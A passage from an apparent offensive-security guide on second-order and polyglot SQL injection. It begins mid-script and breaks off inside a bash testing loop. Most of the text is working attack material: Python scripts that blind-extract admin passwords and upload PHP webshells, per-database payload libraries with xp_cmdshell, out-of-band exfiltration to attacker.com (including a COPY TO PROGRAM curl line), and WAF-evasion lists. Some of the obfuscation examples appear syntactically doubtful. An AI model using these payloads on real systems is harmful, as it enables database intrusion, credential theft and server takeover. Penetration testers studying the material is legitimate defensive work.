        print("[-] No delay detected")
        return False

# MySQL time-based payloads
payloads = [
    "test' AND SLEEP(5) AND '1'='1",
    "test'||(SELECT SLEEP(5))||'",
    "test' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1) AND '1'='1",
    "test'; WAITFOR DELAY '00:00:05'--",  # MSSQL
    "test'||(SELECT pg_sleep(5))||'",  # PostgreSQL
]

# Test each payload
for payload in payloads:
    test_second_order_time(
        'http://target.com/register',
        'http://target.com/profile',
        payload
    )
    time.sleep(2)
```

#### Boolean-Based Detection

```python
#!/usr/bin/env python3
import requests
import hashlib

def test_second_order_boolean(register_url, trigger_url, true_payload, false_payload):
    """Test for second-order SQLi using boolean conditions"""
    
    # Generate unique identifiers
    true_id = hashlib.md5(true_payload.encode()).hexdigest()[:8]
    false_id = hashlib.md5(false_payload.encode()).hexdigest()[:8]
    
    # Step 1: Register with TRUE condition
    print(f"[*] Testing TRUE condition: {true_payload}")
    r1 = requests.post(register_url, data={
        'username': f"test{true_id}",
        'bio': true_payload,
        'email': f'{true_id}@test.com'
    })
    
    # Step 2: Register with FALSE condition
    print(f"[*] Testing FALSE condition: {false_payload}")
    r2 = requests.post(register_url, data={
        'username': f"test{false_id}",
        'bio': false_payload,
        'email': f'{false_id}@test.com'
    })
    
    # Step 3: Trigger both
    trigger_true = requests.get(f"{trigger_url}?user=test{true_id}")
    trigger_false = requests.get(f"{trigger_url}?user=test{false_id}")
    
    # Compare responses
    if len(trigger_true.content) != len(trigger_false.content):
        print("[!] VULNERABLE - Different responses detected!")
        print(f"    TRUE length: {len(trigger_true.content)}")
        print(f"    FALSE length: {len(trigger_false.content)}")
        return True
    else:
        print("[-] Responses identical")
        return False

# Boolean payloads
true_payload = "test' AND '1'='1"
false_payload = "test' AND '1'='2"

test_second_order_boolean(
    'http://target.com/register',
    'http://target.com/search',
    true_payload,
    false_payload
)
```

#### Out-of-Band Detection

```python
#!/usr/bin/env python3
import requests
import time

def test_second_order_oob(register_url, trigger_url, collaborator_domain):
    """Test for second-order SQLi using OOB (DNS/HTTP)"""
    
    # Payloads for different databases
    payloads = {
        'mysql': f"test'||(SELECT LOAD_FILE('\\\\\\\\{collaborator_domain}\\\\share'))||'",
        'mssql': f"test'; EXEC master..xp_dirtree '\\\\{collaborator_domain}\\share';--",
        'oracle': f"test'||(SELECT UTL_HTTP.REQUEST('http://{collaborator_domain}') FROM DUAL)||'",
        'postgres': f"test'||(SELECT pg_read_file('\\\\\\\\{collaborator_domain}\\\\share',0,1))||'"
    }
    
    for db_type, payload in payloads.items():
        print(f"[*] Testing {db_type} OOB payload")
        
        # Register with OOB payload
        r = requests.post(register_url, data={
            'username': f'oob_{db_type}',
            'description': payload,
            'email': f'{db_type}@test.com'
        })
        
        print(f"    Registration: {r.status_code}")
        
        # Trigger
        time.sleep(1)
        requests.get(f"{trigger_url}?user=oob_{db_type}")
        
        print(f"    Check {collaborator_domain} for DNS/HTTP requests")

# Use Burp Collaborator or interact.sh
test_second_order_oob(
    'http://target.com/register',
    'http://target.com/admin/users',
    'YOUR-COLLAB-ID.burpcollaborator.net'
)
```

### Exploitation Strategies

#### Data Exfiltration via Second-Order

```sql
-- Step 1: Store extraction payload in profile
UPDATE users SET bio='test' UNION SELECT GROUP_CONCAT(username,':',password) FROM admin--' WHERE id=1

-- Step 2: Admin views user profile
SELECT bio FROM users WHERE id=1
-- Returns: test' UNION SELECT GROUP_CONCAT(username,':',password) FROM admin--

-- Step 3: Display function uses bio in search
SELECT * FROM posts WHERE author_bio LIKE '%test' UNION SELECT GROUP_CONCAT(username,':',password) FROM admin--%'
```

#### Privilege Escalation via Second-Order

```sql
-- Step 1: Store privilege escalation payload
Username: admin'--

-- Step 2: Login system checks credentials
SELECT * FROM users WHERE username='admin'--' AND password='xxx'
-- Simplified to: SELECT * FROM users WHERE username='admin'
-- Bypasses password check

-- Alternative: Update own privileges
Comment: '; UPDATE users SET role='admin' WHERE username='attacker';--

-- Trigger on admin viewing comments
SELECT comment FROM comments WHERE id=1
-- Retrieves: '; UPDATE users SET role='admin' WHERE username='attacker';--
-- If executed: attacker becomes admin
```

#### Multi-Stage Second-Order Attacks

```sql
-- Stage 1: Plant payload in user profile
Bio: ' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- Stage 2: Admin exports user data to file
SELECT username, email, bio FROM users WHERE verified=0 INTO OUTFILE '/tmp/unverified.csv'
-- Bio field contains injection that writes webshell

-- Stage 3: Access webshell
http://target.com/shell.php?c=id
```

### Database-Specific Second-Order Techniques

#### MySQL/MariaDB

```sql
-- File write via second-order
Bio: ' UNION SELECT '<?php eval($_POST[1]); ?>' INTO OUTFILE '/var/www/html/sh.php'--

-- Load file via second-order
Description: ' UNION SELECT LOAD_FILE('/etc/passwd')--

-- DNS exfiltration
Comment: ' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM admin LIMIT 1),'.attacker.com\\\\share'))--
```

#### PostgreSQL

```sql
-- Command execution via second-order
Bio: '; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'--

-- Large object read
Description: ' UNION SELECT lo_get((SELECT oid FROM pg_largeobject_metadata LIMIT 1))--

-- File read
Comment: ' UNION SELECT pg_read_file('/etc/passwd',0,100000)--
```

#### Microsoft SQL Server

```sql
-- xp_cmdshell via second-order
Notes: '; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';--

-- OLE automation
Bio: '; DECLARE @o INT;EXEC sp_oacreate 'wscript.shell',@o OUT;EXEC sp_oamethod @o,'run',NULL,'cmd /c whoami > c:\\output.txt';--
```

#### Oracle

```sql
-- UTL_HTTP exfiltration
Description: '||(SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM admin WHERE ROWNUM=1)) FROM DUAL)||'

-- File operations
Bio: ' UNION SELECT UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('/tmp','out.txt','W'),'shell code') FROM DUAL--
```

### Testing Checklist for Second-Order SQLi

**Storage Phase Testing:**

1. Inject payloads into all input fields
2. Use unique markers for each payload (e.g., timestamp, random strings)
3. Test special characters: `'`, `"`, `;`, `--`, `/*`, `*/`, `||`, `+`
4. Store time-based payloads with different delays
5. Store OOB payloads with unique identifiers
6. Test different encoding: URL, Unicode, hex, base64

**Retrieval Phase Testing:**

1. Navigate through all application features
2. View stored data in different contexts (profile, admin panel, search results, exports) 3. Test different user roles accessing stored data 4. Monitor response times for each page 5. Check DNS/HTTP logs for OOB callbacks 6. Export data in different formats (CSV, PDF, JSON, XML) 7. Trigger email notifications that include stored data 8. Test API endpoints that retrieve stored information

**Validation Phase:**

```bash
# Compare baseline vs injected responses
- Response time differences
- Content length variations
- HTTP status code changes
- Error messages appearing
- Different data being displayed
- Application behavior changes
```

### Advanced Second-Order Detection with Burp Suite

#### Configuring Burp for Second-Order SQLi

```bash
# Burp Suite Pro Extensions
1. Install "SQLiPy" extension
2. Install "Collaborator Everywhere" for OOB detection
3. Enable "Active Scan++" for advanced SQLi checks

# Manual testing workflow:
1. Use Burp Repeater for storage phase
2. Mark injection points with Â§markersÂ§
3. Use Intruder for payload iteration
4. Monitor Collaborator for OOB interactions
5. Use Comparer to diff responses
```

#### Burp Macro for Automated Second-Order Testing

```
1. Navigate to Project Options > Sessions > Macros
2. Add New Macro:
   - Step 1: POST /register (store payload)
   - Step 2: GET /login (authenticate)
   - Step 3: GET /trigger (execute stored payload)

3. Configure Session Handling Rule:
   - Scope: Include all URLs
   - Rule Actions: Run macro before each request
   - Update extracted parameters

4. Use Intruder with macro:
   - Position: Registration payload field
   - Payloads: SQL injection wordlist
   - Monitor trigger responses for anomalies
```

### Second-Order SQLi Payload Libraries

#### Time-Based Payloads

```sql
-- MySQL
admin' AND SLEEP(5) AND '1'='1
admin'||(SELECT SLEEP(5))||'
admin' AND (SELECT SLEEP(5) FROM users WHERE username='admin') AND '1'='1
admin' AND IF(1=1,SLEEP(5),0) AND '1'='1
admin' UNION SELECT IF(1=1,SLEEP(5),0)--

-- PostgreSQL
admin' AND pg_sleep(5) AND '1'='1
admin'||(SELECT pg_sleep(5))||'
admin' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END) AND '1'='1

-- MSSQL
admin'; WAITFOR DELAY '00:00:05'--
admin' AND (SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3, sysusers AS sys4, sysusers AS sys5)>0 AND '1'='1
admin'; IF(1=1) WAITFOR DELAY '00:00:05'--

-- Oracle
admin' AND (SELECT CASE WHEN 1=1 THEN dbms_pipe.receive_message('a',5) ELSE dbms_pipe.receive_message('a',0) END FROM DUAL) IS NOT NULL AND '1'='1
admin'||(SELECT dbms_pipe.receive_message('a',5) FROM DUAL)||'
```

#### Boolean-Based Payloads

```sql
-- True conditions
admin' AND '1'='1
admin' AND 1=1--
admin' OR 'x'='x
admin'||(SELECT CASE WHEN 1=1 THEN '' ELSE 'x' END)||'

-- False conditions
admin' AND '1'='2
admin' AND 1=2--
admin' OR 'x'='y
admin'||(SELECT CASE WHEN 1=2 THEN '' ELSE 'x' END)||'

-- Data extraction
admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a
admin' AND ASCII(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1))>100--
admin' AND LENGTH((SELECT password FROM admin))>10--
```

#### UNION-Based Payloads

```sql
-- Column discovery
admin' UNION SELECT NULL--
admin' UNION SELECT NULL,NULL--
admin' UNION SELECT NULL,NULL,NULL--

-- Data extraction
admin' UNION SELECT username,password FROM admin--
admin' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM admin--
admin' UNION SELECT table_name,column_name,3 FROM information_schema.columns--

-- Multi-row extraction
admin' UNION SELECT username,password,email FROM users WHERE role='admin'--
admin' UNION ALL SELECT username,password,NULL FROM admin--
```

#### Stacked Queries Payloads

```sql
-- MySQL (limited support)
admin'; INSERT INTO users VALUES('hacker','pass','admin')--
admin'; UPDATE users SET password='hacked' WHERE username='admin'--

-- PostgreSQL
admin'; DROP TABLE IF EXISTS test; CREATE TABLE test(data text);--
admin'; COPY test FROM '/etc/passwd';--
admin'; CREATE FUNCTION shell(text) RETURNS text AS 'sh','system' LANGUAGE c;--

-- MSSQL
admin'; EXEC xp_cmdshell 'whoami';--
admin'; EXEC sp_addsrvrolemember 'attacker','sysadmin';--
admin'; BACKUP DATABASE master TO DISK='\\attacker.com\share\db.bak';--

-- Oracle
admin'; DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO attacker'; COMMIT; END;--
```

#### Out-of-Band Payloads

```sql
-- MySQL - DNS exfiltration
admin'||(SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM admin),'.attacker.com\\\\x')))||'
admin' AND LOAD_FILE(CONCAT('\\\\\\\\',VERSION(),'.attacker.com\\\\share'))--

-- MSSQL - UNC path
admin'; EXEC master..xp_dirtree '\\\\attacker.com\\share';--
admin'; EXEC master..xp_fileexist '\\\\attacker.com\\share';--
admin'; DECLARE @q VARCHAR(8000);SELECT @q=password FROM admin;EXEC('master..xp_dirtree "\\'+@q+'.attacker.com\share"');--

-- Oracle - UTL_HTTP
admin'||(SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM admin WHERE ROWNUM=1)) FROM DUAL)||'
admin' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM admin)||'.attacker.com') FROM DUAL--

-- PostgreSQL - COPY
admin'; COPY (SELECT password FROM admin) TO PROGRAM 'curl http://attacker.com/?data=$(cat)';--
```

### Real-World Second-Order SQLi Scenarios

#### Scenario 1: E-Commerce Product Reviews

```python
#!/usr/bin/env python3
import requests
import time

def exploit_review_sqli(target_url):
    """
    Exploit second-order SQLi in product review system
    Step 1: Submit malicious review
    Step 2: Admin views reviews in dashboard
    Step 3: SQLi executes with admin privileges
    """
    
    # Step 1: Submit review with time-based payload
    review_payload = "Great product!' AND (SELECT SLEEP(5) FROM admin WHERE username='admin') AND '1'='1-- "
    
    review_data = {
        'product_id': '123',
        'rating': '5',
        'review_text': review_payload,
        'reviewer_name': 'John Doe'
    }
    
    print("[*] Submitting malicious review...")
    r1 = requests.post(f"{target_url}/api/reviews", json=review_data)
    print(f"[+] Review submitted: {r1.status_code}")
    
    # Step 2: Simulate admin viewing reviews (or wait for real admin)
    time.sleep(3)
    print("[*] Triggering payload (simulating admin view)...")
    start = time.time()
    r2 = requests.get(f"{target_url}/admin/reviews/pending")
    elapsed = time.time() - start
    
    print(f"[*] Response time: {elapsed:.2f}s")
    if elapsed >= 5:
        print("[!] VULNERABLE! Time delay detected")
        print("[*] Attempting data extraction...")
        
        # Extract admin password character by character
        password = extract_password(target_url)
        print(f"[+] Extracted password: {password}")
    else:
        print("[-] Not vulnerable or payload not triggered")

def extract_password(target_url):
    """Extract admin password using boolean-based blind SQLi"""
    password = ""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    
    for position in range(1, 33):  # Assume max 32 char password
        for char in charset:
            payload = f"Test' AND (SELECT ASCII(SUBSTRING(password,{position},1)) FROM admin WHERE username='admin')={ord(char)}-- "
            
            review_data = {
                'product_id': '123',
                'rating': '5',
                'review_text': payload,
                'reviewer_name': f'test_{position}_{char}'
            }
            
            requests.post(f"{target_url}/api/reviews", json=review_data)
            time.sleep(0.5)
            
            # Check if review appears (boolean response)
            r = requests.get(f"{target_url}/admin/reviews/search?name=test_{position}_{char}")
            
            if "No results" not in r.text:
                password += char
                print(f"[+] Found character: {password}")
                break
        
        if len(password) != position:
            break  # End of password
    
    return password

# Example usage
exploit_review_sqli("http://target-ecommerce.com")
```

#### Scenario 2: Social Media Post/Comment System

```python
#!/usr/bin/env python3
import requests
import time

def exploit_comment_sqli(target_url, session_cookie):
    """
    Exploit second-order SQLi in comment system
    Comments are stored, then displayed on user profiles
    """
    
    headers = {'Cookie': f'session={session_cookie}'}
    
    # Stage 1: Post comment with UNION-based payload
    print("[*] Stage 1: Posting malicious comment...")
    union_payload = "Nice post!' UNION SELECT username,password,email FROM admin--"
    
    comment_data = {
        'post_id': '456',
        'comment': union_payload
    }
    
    r1 = requests.post(f"{target_url}/api/comments", json=comment_data, headers=headers)
    print(f"[+] Comment posted: {r1.status_code}")
    
    # Stage 2: View profile to trigger injection
    time.sleep(2)
    print("[*] Stage 2: Triggering payload...")
    r2 = requests.get(f"{target_url}/profile/view", headers=headers)
    
    # Check if admin credentials appear in response
    if "admin" in r2.text and len(r2.text) > 5000:
        print("[!] VULNERABLE! Data extracted:")
        # Parse response for credentials
        print(r2.text)
    
    # Stage 3: Alternative - File write
    print("[*] Stage 3: Attempting file write...")
    file_payload = "Comment' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'--"
    
    comment_data['comment'] = file_payload
    requests.post(f"{target_url}/api/comments", json=comment_data, headers=headers)
    
    time.sleep(1)
    requests.get(f"{target_url}/profile/view", headers=headers)
    
    # Test webshell
    print("[*] Testing webshell...")
    r3 = requests.get(f"{target_url}/cmd.php?c=id")
    if r3.status_code == 200:
        print("[!] WEBSHELL UPLOADED!")
        print(f"[+] Output: {r3.text}")

# Example usage
exploit_comment_sqli("http://target-social.com", "your_session_cookie_here")
```

#### Scenario 3: File Upload Metadata

```python
#!/usr/bin/env python3
import requests
import time

def exploit_upload_metadata(target_url):
    """
    Exploit second-order SQLi in file upload metadata
    Filename/description stored, then used in admin file browser
    """
    
    # Malicious filename with SQLi
    files = {
        'file': ('test.txt', b'test content', 'text/plain')
    }
    
    # Time-based payload in description
    data = {
        'description': "File' AND (SELECT SLEEP(5)) AND '1'='1--",
        'category': 'documents'
    }
    
    print("[*] Uploading file with malicious metadata...")
    r1 = requests.post(f"{target_url}/upload", files=files, data=data)
    print(f"[+] Upload status: {r1.status_code}")
    
    # Wait and trigger
    time.sleep(2)
    print("[*] Triggering via admin file browser...")
    start = time.time()
    r2 = requests.get(f"{target_url}/admin/files")
    elapsed = time.time() - start
    
    if elapsed >= 5:
        print("[!] VULNERABLE! Exploiting...")
        
        # Extract database name
        db_name = ""
        for i in range(1, 20):
            for char_code in range(97, 123):  # a-z
                payload = f"File' AND (SELECT IF(ASCII(SUBSTRING(DATABASE(),{i},1))={char_code},SLEEP(3),0)) AND '1'='1--"
                
                files = {'file': ('test.txt', b'test', 'text/plain')}
                data = {'description': payload}
                
                requests.post(f"{target_url}/upload", files=files, data=data)
                time.sleep(1)
                
                start = time.time()
                requests.get(f"{target_url}/admin/files")
                elapsed = time.time() - start
                
                if elapsed >= 3:
                    db_name += chr(char_code)
                    print(f"[+] Database name: {db_name}")
                    break
            
            if not db_name or len(db_name) != i:
                break
        
        print(f"[+] Final database name: {db_name}")

# Example usage
exploit_upload_metadata("http://target-filehost.com")
```

### Defense Evasion in Second-Order SQLi

#### Bypassing WAF/IDS

```sql
-- Encoding techniques
admin' AND SLEEP(5)--
admin%27%20AND%20SLEEP(5)--  -- URL encoded
admin\u0027 AND SLEEP(5)--  -- Unicode
admin%2527%2520AND%2520SLEEP(5)--  -- Double URL encoded

-- Case manipulation
admin' AnD sLeEp(5)--
admin' aNd SlEeP(5)--

-- Comment insertion
admin'/**/AND/**/SLEEP(5)--
admin'/*!50000AND*/SLEEP(5)--  -- MySQL conditional comments
admin'/*comment*/AND/**/SLEEP(5)--

-- Whitespace alternatives
admin'%09AND%09SLEEP(5)--  -- Tab
admin'%0AAND%0ASLEEP(5)--  -- Newline
admin'%0DAND%0DSLEEP(5)--  -- Carriage return
admin'%A0AND%A0SLEEP(5)--  -- Non-breaking space

-- Function alternatives
admin' AND BENCHMARK(10000000,MD5('a'))--  -- Instead of SLEEP
admin' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)--  -- Heavy query
```

#### Obfuscation Techniques

```sql
-- String concatenation
admin' AND CONCAT('SLE','EP')(5)--
admin' AND CONCAT_WS('','SL','EE','P')(5)--

-- Hexadecimal encoding
admin' AND 0x53454c454354--  -- SELECT in hex
admin' UNION 0x53454c454354--

-- Using functions to build queries
admin' AND (SELECT SLEEP(5) FROM (SELECT 1)x)--
admin' AND (SELECT(SLEEP(5))FROM(SELECT(1))x)--

-- Alternative syntax
admin' AND {'a':'b'} AND SLEEP(5)--  -- JSON
admin' AND [1] AND SLEEP(5)--  -- Array notation
```

### Automated Second-Order SQLi Testing

#### Custom SQLmap Configuration

```bash
# Create custom tamper script for second-order
# File: second_order.py
#!/usr/bin/env python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Store payload in session for second-order testing
    """
    import requests
    
    # Store phase
    requests.post('http://target.com/register', data={
        'username': payload,
        'email': 'test@test.com'
    })
    
    # Trigger phase
    response = requests.get('http://target.com/profile')
    
    return payload

# Usage
sqlmap -u "http://target.com/register" --data="username=test&email=test@test.com" \
    --second-url="http://target.com/profile" \
    --technique=T --level=5 --risk=3 \
    --tamper=second_order --batch
```

#### Comprehensive Testing Script

```python
#!/usr/bin/env python3
import requests
import time
import itertools
import hashlib
from concurrent.futures import ThreadPoolExecutor

class SecondOrderSQLiTester:
    def __init__(self, storage_url, trigger_url, param_name):
        self.storage_url = storage_url
        self.trigger_url = trigger_url
        self.param_name = param_name
        self.vulnerable = False
        self.payload_type = None
        
    def test_time_based(self, payload):
        """Test time-based blind SQLi"""
        unique_id = hashlib.md5(payload.encode()).hexdigest()[:8]
        
        # Store
        data = {self.param_name: payload, 'id': unique_id}
        requests.post(self.storage_url, data=data, timeout=10)
        
        time.sleep(1)
        
        # Trigger
        start = time.time()
        try:
            requests.get(f"{self.trigger_url}?id={unique_id}", timeout=15)
            elapsed = time.time() - start
            
            if elapsed >= 5:
                print(f"[!] TIME-BASED VULNERABLE: {payload}")
                self.vulnerable = True
                self.payload_type = "time-based"
                return True
        except requests.exceptions.Timeout:
            print(f"[!] TIMEOUT - Possible vulnerability: {payload}")
            return True
        
        return False
    
    def test_boolean_based(self, true_payload, false_payload):
        """Test boolean-based blind SQLi"""
        true_id = hashlib.md5(true_payload.encode()).hexdigest()[:8]
        false_id = hashlib.md5(false_payload.encode()).hexdigest()[:8]
        
        # Store both
        requests.post(self.storage_url, data={self.param_name: true_payload, 'id': true_id})
        requests.post(self.storage_url, data={self.param_name: false_payload, 'id': false_id})
        
        time.sleep(1)
        
        # Trigger both
        r_true = requests.get(f"{self.trigger_url}?id={true_id}")
        r_false = requests.get(f"{self.trigger_url}?id={false_id}")
        
        if len(r_true.content) != len(r_false.content):
            print(f"[!] BOOLEAN-BASED VULNERABLE")
            print(f"    TRUE: {len(r_true.content)} bytes")
            print(f"    FALSE: {len(r_false.content)} bytes")
            self.vulnerable = True
            self.payload_type = "boolean-based"
            return True
        
        return False
    
    def test_union_based(self, payload):
        """Test UNION-based SQLi"""
        unique_id = hashlib.md5(payload.encode()).hexdigest()[:8]
        
        # Store
        data = {self.param_name: payload, 'id': unique_id}
        requests.post(self.storage_url, data=data)
        
        time.sleep(1)
        
        # Trigger
        r = requests.get(f"{self.trigger_url}?id={unique_id}")
        
        # Look for error messages or unexpected data
        error_indicators = [
            'mysql', 'sql syntax', 'postgresql', 'ora-', 'microsoft sql',
            'unclosed quotation', 'syntax error', 'warning'
        ]
        
        if any(indicator in r.text.lower() for indicator in error_indicators):
            print(f"[!] UNION-BASED VULNERABLE: {payload}")
            self.vulnerable = True
            self.payload_type = "union-based"
            return True
        
        return False
    
    def run_all_tests(self):
        """Run comprehensive second-order SQLi tests"""
        print("[*] Starting second-order SQLi testing...")
        print(f"[*] Storage URL: {self.storage_url}")
        print(f"[*] Trigger URL: {self.trigger_url}")
        print(f"[*] Parameter: {self.param_name}")
        print()
        
        # Time-based payloads
        time_payloads = [
            "test' AND SLEEP(5)--",
            "test' AND (SELECT SLEEP(5))--",
            "test'||(SELECT SLEEP(5))||'",
            "test'; WAITFOR DELAY '00:00:05'--",
            "test'||(SELECT pg_sleep(5))||'",
        ]
        
        print("[*] Testing time-based blind SQLi...")
        for payload in time_payloads:
            if self.test_time_based(payload):
                break
        
        # Boolean-based payloads
        print("\n[*] Testing boolean-based blind SQLi...")
        boolean_pairs = [
            ("test' AND '1'='1", "test' AND '1'='2"),
            ("test' AND 1=1--", "test' AND 1=2--"),
            ("test' OR 'x'='x", "test' OR 'x'='y"),
        ]
        
        for true_payload, false_payload in boolean_pairs:
            if self.test_boolean_based(true_payload, false_payload):
                break
        
        # UNION-based payloads
        print("\n[*] Testing UNION-based SQLi...")
        union_payloads = [
            "test' UNION SELECT NULL--",
            "test' UNION SELECT NULL,NULL--",
            "test' UNION SELECT NULL,NULL,NULL--",
            "test' UNION SELECT 1,2,3--",
        ]
        
        for payload in union_payloads:
            if self.test_union_based(payload):
                break
        
        # Summary
        print("\n" + "="*50)
        if self.vulnerable:
            print(f"[!] APPLICATION IS VULNERABLE")
            print(f"[!] Vulnerability type: {self.payload_type}")
        else:
            print("[-] No vulnerabilities detected")
        print("="*50)

# Example usage
if __name__ == "__main__":
    tester = SecondOrderSQLiTester(
        storage_url="http://target.com/api/register",
        trigger_url="http://target.com/api/profile",
        param_name="username"
    )
    tester.run_all_tests()
```

### Key Differences: First-Order vs Second-Order SQLi

**First-Order SQLi:**

- Immediate execution
- Direct response visible
- Easier to detect
- Traditional WAF rules effective
- Testing: Single request cycle

**Second-Order SQLi:**

- Delayed execution
- Indirect response
- Harder to detect with automated tools
- WAF bypass through storage
- Testing: Multi-request cycle (store â†’ trigger)

### Important Considerations

**[Inference]** Second-order SQLi is more common in features where user input is stored and later used by privileged operations (admin panels, reporting, exports). Testing should focus on identifying storage-to-retrieval flows.

**[Unverified]** Not all second-order SQLi can be detected with time-based techniques. Some may require careful analysis of application behavior, data exposure, or privilege escalation attempts to confirm.

**[Inference]** Modern frameworks with prepared statements prevent first-order SQLi but may still be vulnerable to second-order attacks if stored data is concatenated into queries without sanitization.

## Related Advanced Topics

- **Blind SQLi Automation** - Building custom tools for efficient boolean/time-based extraction
- **Database-Specific Exploitation** - Leveraging unique features of MySQL, PostgreSQL, MSSQL, Oracle
- **SQLi in NoSQL Contexts** - MongoDB, CouchDB injection techniques
- **Web Application Firewall (WAF) Bypass** - Advanced evasion for SQLi payloads

---

## Polyglot SQLi Payloads

Polyglot payloads are specially crafted inputs that function as valid SQL injection vectors across multiple database management systems (DBMS) and injection contexts simultaneously, bypassing various filters and WAFs.

### Core Polyglot Concepts

**Multi-context compatibility:**

- Function across string, numeric, and search contexts
- Work in WHERE, ORDER BY, LIMIT, and other clauses
- Maintain syntactic validity across MySQL, PostgreSQL, MSSQL, Oracle

### Universal Polyglot Payloads

**Basic polyglot structure:**

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

This payload:

- Works in numeric context: `SLEEP(1)`
- String context with single quotes: `' or SLEEP(1) or '`
- String context with double quotes: `" or SLEEP(1) or "`
- Comment prevents syntax errors: `/*...*/`

**Advanced multi-DBMS polyglot:**

```sql
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -
1' AND (SELECT COUNT(*) FROM sysibm.sysdummy1 WHERE 1=1 AND 5=(SELECT UNICODE(SUBSTRING((SELECT @@version),1,1))))-- -
```

**Universal authentication bypass polyglot:**

```sql
admin' or '1'='1'--
admin' or 1=1--
admin'/**/or/**/1=1--
admin' or '1'='1'/*
admin' or '1'='1'#
admin'||'1'='1
admin' or 'x'='x
admin') or ('1'='1
admin') or '1'='1'--
```

### Context-Aware Polyglots

**String context polyglot:**

```sql
' OR '1'='1' -- 
' OR '1'='1' /*
' OR '1'='1' #
' OR 1=1-- -
'/**/OR/**/1=1-- -
' OR 'something' LIKE 's%'-- -
```

**Numeric context polyglot:**

```sql
1 OR 1=1-- -
1 OR 1=1#
1) OR 1=1-- -
1)) OR 1=1-- -
1 OR '1'='1
1' OR '1'='1
1 UNION SELECT NULL-- -
```

**Mixed context polyglot:**

```sql
1'1
1"1
1`1
' OR 1=1--
" OR 1=1--
` OR 1=1--
') OR ('1'='1
") OR ("1"="1
`) OR (`1`=`1
```

### WAF Bypass Polyglots

**Obfuscated polyglot with inline comments:**

```sql
'/**/OR/**/1=1--
'/**/OR/**/1=1%23
'/**/OR/**/1=1%00
'/**/UNION/**/SELECT/**/NULL,NULL,NULL--
'/**/UNION/**/ALL/**/SELECT/**/NULL--
```

**Case variation polyglot:**

```sql
' Or '1'='1' -- 
' oR '1'='1' -- 
' OR '1'='1' --
' or '1'='1' --
' UnIoN SeLeCt NULL--
```

**Whitespace and comment polyglot:**

```sql
'OR'1'='1
'OR/*comment*/'1'='1
'OR/**/'1'='1
'OR+1=1--
'OR%091=1--
'OR%0d%0a1=1--
```

**Encoding-based polyglot:**

```sql
# URL encoding
%27%20OR%201=1--
%27%20OR%20%271%27=%271

# Double URL encoding
%2527%2520OR%25201=1--

# Unicode encoding
\u0027\u0020OR\u00201=1--

# Hex encoding (MySQL)
0x27204f522031=312d2d
```

### Database-Specific Polyglots

**MySQL polyglot:**

```sql
' OR 1=1#
' OR 1=1-- -
' OR 1=1/*
' UNION SELECT NULL,NULL,NULL#
'/**/UNION/**/SELECT/**/NULL,NULL,NULL#
' OR 'x'='x' #
' /*!50000OR*/ 1=1--
```

**PostgreSQL polyglot:**

```sql
' OR 1=1--
' OR 1=1;--
' OR 'a'='a'--
' UNION SELECT NULL,NULL--
' OR 1::int=1--
' OR TRUE--
```

**MSSQL polyglot:**

```sql
' OR 1=1--
' OR 1=1;--
' UNION SELECT NULL,NULL,NULL--
' OR 'x'='x'--
'; WAITFOR DELAY '0:0:5'--
' AND 1=(SELECT COUNT(*) FROM sysusers)--
```

**Oracle polyglot:**

```sql
' OR 1=1--
' OR 'x'='x'--
' UNION SELECT NULL,NULL FROM dual--
' AND 1=(SELECT COUNT(*) FROM all_users)--
' OR 1=1||'
```

### Advanced Polyglot Construction

**Python script for generating polyglots:**

```python
#!/usr/bin/env python3

def generate_polyglot_payload(base_payload, contexts):
    """
    Generate polyglot payload for multiple injection contexts
    """
    polyglots = []
    
    # Quote variations
    quotes = ["'", '"', '`']
    
    # Comment styles
    comments = ['--', '--+', '--+-', '-- -', '#', '/*', '/**/', ';%00']
    
    # Logical operators
    operators = ['OR', 'AND', '||', '&&']
    
    for quote in quotes:
        for op in operators:
            for comment in comments:
                # Basic polyglot structure
                payload = f"{quote} {op} 1=1 {comment}"
                polyglots.append(payload)
                
                # Parenthesis variations
                payload = f"{quote}) {op} (1=1 {comment}"
                polyglots.append(payload)
                
                # Double parenthesis
                payload = f"{quote})) {op} ((1=1 {comment}"
                polyglots.append(payload)
    
    return polyglots

# Generate payloads
payloads = generate_polyglot_payload("1=1", ["string", "numeric"])

# Filter unique payloads
unique_payloads = list(set(payloads))

for payload in unique_payloads[:20]:  # Show first 20
    print(payload)
```

**Automated polyglot testing script:**

```bash
#!/bin/bash

TARGET="http://target.com/vuln?id="
POLYGLOTS=(
    "' OR '1'='1'--"
    "\" OR \"1\"=\"1\"--"
    "' OR 1=1--"
    "') OR ('1'='1"
    "\") OR (\"1\"=\"1"
    "' OR 'x'='x"
    "1' OR '1'='1"
    "admin'--"
    "admin' #"
    "admin'/*"
)

for payload in "${POLYGLOTS[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    echo "[*] Testing: $payload"
    response=$(curl -s "${TARGET}${encoded}")
    
    # Check for success indicators
